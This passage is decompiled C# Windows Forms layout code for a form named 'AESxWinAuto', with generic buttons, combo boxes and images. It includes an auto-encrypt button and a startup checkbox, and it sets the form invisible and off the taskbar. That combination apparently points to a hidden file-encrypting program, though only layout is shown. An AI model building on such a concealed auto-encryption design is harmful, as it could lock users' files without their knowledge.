		((Control)button7).set_Location(new Point(372, 67));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(75, 23));
		((Control)button7).set_TabIndex(37);
		((Control)button7).set_Text("button7");
		((ButtonBase)button7).set_UseVisualStyleBackColor(true);
		((Control)button8).set_Location(new Point(290, 58));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(75, 23));
		((Control)button8).set_TabIndex(36);
		((Control)button8).set_Text("button8");
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((Control)button9).set_Location(new Point(178, 58));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(75, 23));
		((Control)button9).set_TabIndex(35);
		((Control)button9).set_Text("button9");
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button10).set_Location(new Point(235, 68));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(75, 23));
		((Control)button10).set_TabIndex(34);
		((Control)button10).set_Text("button10");
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((Control)button11).set_Location(new Point(162, 45));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(75, 23));
		((Control)button11).set_TabIndex(33);
		((Control)button11).set_Text("button11");
		((ButtonBase)button11).set_UseVisualStyleBackColor(true);
		((Control)button12).set_Location(new Point(270, 59));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(75, 23));
		((Control)button12).set_TabIndex(32);
		((Control)button12).set_Text("button12");
		((ButtonBase)button12).set_UseVisualStyleBackColor(true);
		((Control)button13).set_Location(new Point(371, 55));
		((Control)button13).set_Name("button13");
		((Control)button13).set_Size(new Size(75, 23));
		((Control)button13).set_TabIndex(43);
		((Control)button13).set_Text("button13");
		((ButtonBase)button13).set_UseVisualStyleBackColor(true);
		((Control)button14).set_Location(new Point(289, 46));
		((Control)button14).set_Name("button14");
		((Control)button14).set_Size(new Size(75, 23));
		((Control)button14).set_TabIndex(42);
		((Control)button14).set_Text("button14");
		((ButtonBase)button14).set_UseVisualStyleBackColor(true);
		((Control)button15).set_Location(new Point(177, 46));
		((Control)button15).set_Name("button15");
		((Control)button15).set_Size(new Size(75, 23));
		((Control)button15).set_TabIndex(41);
		((Control)button15).set_Text("button15");
		((ButtonBase)button15).set_UseVisualStyleBackColor(true);
		((Control)button16).set_Location(new Point(234, 56));
		((Control)button16).set_Name("button16");
		((Control)button16).set_Size(new Size(75, 23));
		((Control)button16).set_TabIndex(40);
		((Control)button16).set_Text("button16");
		((ButtonBase)button16).set_UseVisualStyleBackColor(true);
		((Control)button17).set_Location(new Point(161, 33));
		((Control)button17).set_Name("button17");
		((Control)button17).set_Size(new Size(75, 23));
		((Control)button17).set_TabIndex(39);
		((Control)button17).set_Text("button17");
		((ButtonBase)button17).set_UseVisualStyleBackColor(true);
		((Control)button18).set_Location(new Point(269, 47));
		((Control)button18).set_Name("button18");
		((Control)button18).set_Size(new Size(75, 23));
		((Control)button18).set_TabIndex(38);
		((Control)button18).set_Text("button18");
		((ButtonBase)button18).set_UseVisualStyleBackColor(true);
		((Control)button19).set_Location(new Point(380, 75));
		((Control)button19).set_Name("button19");
		((Control)button19).set_Size(new Size(75, 23));
		((Control)button19).set_TabIndex(49);
		((Control)button19).set_Text("button19");
		((ButtonBase)button19).set_UseVisualStyleBackColor(true);
		((Control)button20).set_Location(new Point(298, 66));
		((Control)button20).set_Name("button20");
		((Control)button20).set_Size(new Size(75, 23));
		((Control)button20).set_TabIndex(48);
		((Control)button20).set_Text("button20");
		((ButtonBase)button20).set_UseVisualStyleBackColor(true);
		((Control)button21).set_Location(new Point(186, 66));
		((Control)button21).set_Name("button21");
		((Control)button21).set_Size(new Size(75, 23));
		((Control)button21).set_TabIndex(47);
		((Control)button21).set_Text("button21");
		((ButtonBase)button21).set_UseVisualStyleBackColor(true);
		((Control)button22).set_Location(new Point(243, 76));
		((Control)button22).set_Name("button22");
		((Control)button22).set_Size(new Size(75, 23));
		((Control)button22).set_TabIndex(46);
		((Control)button22).set_Text("button22");
		((ButtonBase)button22).set_UseVisualStyleBackColor(true);
		((Control)button23).set_Location(new Point(170, 53));
		((Control)button23).set_Name("button23");
		((Control)button23).set_Size(new Size(75, 23));
		((Control)button23).set_TabIndex(45);
		((Control)button23).set_Text("button23");
		((ButtonBase)button23).set_UseVisualStyleBackColor(true);
		((Control)button24).set_Location(new Point(278, 67));
		((Control)button24).set_Name("button24");
		((Control)button24).set_Size(new Size(75, 23));
		((Control)button24).set_TabIndex(44);
		((Control)button24).set_Text("button24");
		((ButtonBase)button24).set_UseVisualStyleBackColor(true);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		((Control)comboBox1).set_Location(new Point(64, 12));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(121, 24));
		((Control)comboBox1).set_TabIndex(50);
		((ListControl)comboBox2).set_FormattingEnabled(true);
		((Control)comboBox2).set_Location(new Point(329, 27));
		((Control)comboBox2).set_Name("comboBox2");
		((Control)comboBox2).set_Size(new Size(254, 24));
		((Control)comboBox2).set_TabIndex(51);
		((Control)richTextBox1).set_Location(new Point(58, 18));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(83, 48));
		((Control)richTextBox1).set_TabIndex(52);
		((Control)richTextBox1).set_Text("");
		pictureBox6.set_Image((Image)(object)Resources.kopacz);
		((Control)pictureBox6).set_Location(new Point(142, 38));
		((Control)pictureBox6).set_Name("pictureBox6");
		((Control)pictureBox6).set_Size(new Size(100, 50));
		pictureBox6.set_TabIndex(56);
		pictureBox6.set_TabStop(false);
		((Control)pictureBox6).add_Click((EventHandler)pictureBox6_Click);
		pictureBox5.set_Image((Image)(object)Resources.OnpTFV2c);
		((Control)pictureBox5).set_Location(new Point(253, 55));
		((Control)pictureBox5).set_Name("pictureBox5");
		((Control)pictureBox5).set_Size(new Size(56, 50));
		pictureBox5.set_TabIndex(55);
		pictureBox5.set_TabStop(false);
		pictureBox4.set_Image((Image)(object)Resources._0006P4VIMQV41RSN_C122_F4);
		((Control)pictureBox4).set_Location(new Point(234, 26));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(100, 50));
		pictureBox4.set_TabIndex(54);
		pictureBox4.set_TabStop(false);
		((Control)pictureBox1).set_Location(new Point(90, 18));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(100, 50));
		pictureBox1.set_TabIndex(53);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((Control)pictureBox3).set_Location(new Point(266, 93));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(100, 50));
		pictureBox3.set_TabIndex(24);
		pictureBox3.set_TabStop(false);
		((Control)pictureBox2).set_Location(new Point(303, 82));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(100, 50));
		pictureBox2.set_TabIndex(23);
		pictureBox2.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(609, 136));
		((Control)this).get_Controls().Add((Control)(object)pictureBox6);
		((Control)this).get_Controls().Add((Control)(object)pictureBox5);
		((Control)this).get_Controls().Add((Control)(object)pictureBox4);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)comboBox2);
		((Control)this).get_Controls().Add((Control)(object)comboBox1);
		((Control)this).get_Controls().Add((Control)(object)button19);
		((Control)this).get_Controls().Add((Control)(object)button20);
		((Control)this).get_Controls().Add((Control)(object)button21);
		((Control)this).get_Controls().Add((Control)(object)button22);
		((Control)this).get_Controls().Add((Control)(object)button23);
		((Control)this).get_Controls().Add((Control)(object)button24);
		((Control)this).get_Controls().Add((Control)(object)button13);
		((Control)this).get_Controls().Add((Control)(object)button14);
		((Control)this).get_Controls().Add((Control)(object)button15);
		((Control)this).get_Controls().Add((Control)(object)button16);
		((Control)this).get_Controls().Add((Control)(object)button17);
		((Control)this).get_Controls().Add((Control)(object)button18);
		((Control)this).get_Controls().Add((Control)(object)button7);
		((Control)this).get_Controls().Add((Control)(object)button8);
		((Control)this).get_Controls().Add((Control)(object)button9);
		((Control)this).get_Controls().Add((Control)(object)button10);
		((Control)this).get_Controls().Add((Control)(object)button11);
		((Control)this).get_Controls().Add((Control)(object)button12);
		((Control)this).get_Controls().Add((Control)(object)button6);
		((Control)this).get_Controls().Add((Control)(object)button5);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox3);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Control)this).get_Controls().Add((Control)(object)btnStartAutoEncrypt);
		((Control)this).get_Controls().Add((Control)(object)chckIsStartup);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("AESxWinAuto");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("AESxWinAuto");
		((ISupportInitialize)pictureBox6).EndInit();
		((ISupportInitialize)pictureBox5).EndInit();
		((ISupportInitialize)pictureBox4).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
